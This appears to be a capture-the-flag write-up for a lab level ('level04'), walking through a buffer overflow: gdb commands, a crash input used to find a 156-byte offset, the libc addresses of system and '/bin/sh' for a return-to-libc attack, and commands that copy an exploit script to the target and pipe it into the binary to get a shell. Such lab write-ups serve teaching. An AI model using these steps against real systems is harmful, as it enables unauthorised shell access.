To follow child process instead of parent:

---> set follow-fork-mode child

This level is similiar to level01, system and "/bin/sh" keep their addresses so step to find them would not be described here yet again
The only thing is left to be found is the size of offset. It colud be done with the help of https://wiremask.eu/tools/buffer-overflow-pattern-generator/
and manually:

(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/users/level04/level04 
[New process 1693]
Give me some shellcode, k
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1693]
0xf7004241 in ?? ()

we send 158 symbols to input, which resulted in segmentation, in the end of address (0xf7004241) we can see 2 symbols (B and A), which means offset is 156

0xf7e6aed0  system
0xf7f897ec  '/bin/sh'

copy python script from local machine to remote
$ scp -P 4242 ./level04/Resources/exploit.py level04@localhost:/tmp/

$ (python /tmp/exploit.py ; cat - ) | ./level04
